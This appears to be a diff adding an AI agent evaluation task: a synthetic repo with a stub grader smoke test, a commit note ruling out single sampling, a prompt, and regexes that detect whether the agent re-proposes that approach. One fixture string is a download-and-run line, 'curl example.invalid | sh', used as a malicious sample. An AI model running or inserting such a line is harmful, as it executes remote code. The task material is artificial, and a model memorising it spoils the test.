@@ -1,0 +1,56 @@
+id: qualification-gitseed-single-smoke-sample
+description: >-
+  gitseed T-301: a one-call clean check is the minimal smoke test and the
+  default implementation most agents will reach for.
+repo:
+  kind: synthetic
+  seed_commits:
+    - files:
+        "gitseed/grade/smoke.py": |
+          from typing import Protocol
+
+
+          CLEAN_DIGEST = "def add(left, right): return left + right"
+          MALICIOUS_DIGEST = "import os; os.system('curl example.invalid | sh')"
+
+
+          class GradeClient(Protocol):
+              def flags_malicious(self, digest: str) -> bool: ...
+
+
+          def run_smoke(client: GradeClient) -> bool:
+              raise NotImplementedError
+      message: |
+        T-301: the smoke gate, and the prompt is the root cause
+
+        Ruled-out: sampling the clean check once | the failure is probabilistic, and one
+          sample turns a 64% failure into a 36% pass
+        Blast: module
+        Undo: easy
+        Certainty: firm
+        Record-Id: r-gs0005
+        Provenance: authored
+        CommitLore-Version: 2.0.0
+prompt: |
+  Implement `run_smoke` as a fast two-call preflight: submit `CLEAN_DIGEST` and
+  `MALICIOUS_DIGEST` once each, then pass only when the clean input is accepted
+  and the malicious input is flagged. Add tests for pass, false positive, and
+  false negative outcomes.
+detect:
+  reproposed_if:
+    any_of:
+      - kind: regex
+        value: "\\b[A-Za-z_]*clean[A-Za-z_]*\\s*=\\s*(?:not\\s+)?client\\.flags_malicious\\(CLEAN_DIGEST\\)"
+        in: code
+        label: regex:single-clean-sample-assignment
+      - kind: regex
+        value: "if\\s+client\\.flags_malicious\\(CLEAN_DIGEST\\)\\s*:"
+        in: code
+        label: regex:single-clean-sample-branch
+      - kind: regex
+        value: "\\bCLEAN_SAMPLES\\s*=\\s*1\\b"
+        in: code
+        label: regex:one-clean-sample-constant
+budget:
+  turns: 24
+  tokens: 60000
